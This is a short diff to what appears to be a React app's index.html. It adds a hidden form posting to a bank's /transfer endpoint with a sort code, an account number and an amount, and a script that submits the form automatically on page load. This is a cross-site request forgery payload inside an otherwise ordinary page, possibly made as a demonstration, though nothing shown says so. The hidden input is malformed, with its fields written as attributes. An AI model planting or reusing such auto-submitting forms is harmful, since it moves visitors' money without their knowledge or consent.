@@ -42,5 +42,12 @@
       To begin the development, run `npm start` or `yarn start`.
       To create a production bundle, use `npm run build` or `yarn build`.
     -->
+
+    <form action="https://saturnbank.com/transfer" method="POST">
+      <input type="hidden" bsb="421314" accountNo="1736123125" amount="100" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
   </body>
 </html>
